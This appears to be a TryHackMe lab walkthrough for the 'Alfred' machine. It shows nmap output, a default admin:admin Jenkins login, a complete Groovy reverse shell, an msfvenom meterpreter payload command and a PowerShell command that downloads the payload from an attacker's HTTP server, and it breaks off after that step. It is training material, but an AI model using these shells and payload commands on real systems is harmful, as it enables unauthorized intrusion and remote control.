# Alfred - TryHackMe Machine

- Nmap scan

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 10:56 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
Initiating Ping Scan at 10:56
Scanning 10.10.213.210 [2 ports]
Completed Ping Scan at 10:56, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:56
Completed Parallel DNS resolution of 1 host. at 10:56, 0.07s elapsed
Initiating Connect Scan at 10:56
Scanning 10.10.213.210 [3 ports]
Discovered open port 8080/tcp on 10.10.213.210
Discovered open port 80/tcp on 10.10.213.210
Discovered open port 3389/tcp on 10.10.213.210
Completed Connect Scan at 10:56, 0.18s elapsed (3 total ports)
Initiating Service scan at 10:56
Scanning 3 services on 10.10.213.210
Completed Service scan at 10:57, 11.95s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.213.210.
Initiating NSE at 10:57
Completed NSE at 10:57, 5.78s elapsed
Initiating NSE at 10:57
Completed NSE at 10:57, 0.93s elapsed
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
Nmap scan report for 10.10.213.210
Host is up (0.18s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-07-26T20:09:33
| Not valid after:  2022-01-25T20:09:33
| MD5:   2f3a 3a9d f0b3 72c0 ecf2 3ca1 9ee6 04ed
|_SHA-1: 0839 8e6c 3055 0696 3351 b8c2 1ccf 5fb5 8fe0 19e5
|_ssl-date: 2021-07-27T20:27:17+00:00; +5h30m02s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5h30m01s

NSE: Script Post-scanning.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.57 seconds
```

- Port 8080 → login panel → admin:admin → jenkins project management system or something like that
- Port 80 → just an image and some text

### Initial Access

- Used a groovy reverse shell script to initial access

```bash
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Upgrading to meterpreter shell is quite difficult
    - Created an exploit using msfvenom

        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
        ```

    - Sharing it with the target machine (downloading actually)

        ```bash
        powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
        ```